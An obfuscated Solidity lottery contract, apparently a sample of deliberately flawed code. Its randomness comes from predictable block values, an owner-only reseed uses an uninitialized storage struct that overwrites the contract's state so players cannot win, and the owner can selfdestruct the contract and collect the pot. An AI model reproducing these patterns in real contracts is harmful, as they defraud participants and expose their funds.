pragma solidity ^0.4.19;

contract OpenAddressLottery{
    struct SeedComponents{
        uint _0x3a63cb;
        uint _0xa4a6ad;
        uint _0x26652e;
        uint _0xaf4659;
    }

    address _0xc576ac;
    uint private _0xad5dd6;
    uint private _0x13c669;
    uint LuckyNumber = 7;

    mapping (address => bool) _0x78991d;

    function OpenAddressLottery() {
        _0xc576ac = msg.sender;
        _0x573d2a(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));
    }

    function _0xa05419() payable {
        if(msg.value<0.1 ether)
            return;


        require(_0x78991d[msg.sender] == false);

        if(_0xe553f0(msg.sender) == LuckyNumber){
            _0x78991d[msg.sender] = true;

            uint _0x6fc8aa=msg.value*7;

            if(_0x6fc8aa>this.balance)
                _0x6fc8aa=this.balance;
            msg.sender.transfer(_0x6fc8aa);
        }

        if(block.number-_0x13c669>1000)
            _0x573d2a(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));
    }

    function _0xe553f0(address _0xf7f4a6) constant returns(uint n){

        n = uint(_0xd3bb1b(uint(_0xf7f4a6), _0xad5dd6)[0]) % 8;
    }

    function _0x573d2a(SeedComponents _0xf32a69) internal {
        _0xad5dd6 = uint256(_0xd3bb1b(
            _0xf32a69._0x3a63cb,
            _0xf32a69._0xa4a6ad,
            _0xf32a69._0x26652e,
            _0xf32a69._0xaf4659
        ));
        if (1 == 1) { _0x13c669 = block.number; }
    }

    function _0xfee621() {
        require(msg.sender==_0xc576ac);

        selfdestruct(msg.sender);
    }

    function _0xfeed76() {
        require(msg.sender==_0xc576ac);
        SeedComponents s;
        s._0x3a63cb = uint(msg.sender);
        s._0xa4a6ad = uint256(block.blockhash(block.number - 1));
        s._0x26652e = block.difficulty*(uint)(block.coinbase);
        s._0xaf4659 = tx.gasprice * 7;

        _0x573d2a(s);
    }

    function () payable {
        if(msg.value>=0.1 ether && msg.sender!=_0xc576ac)
            _0xa05419();
    }

}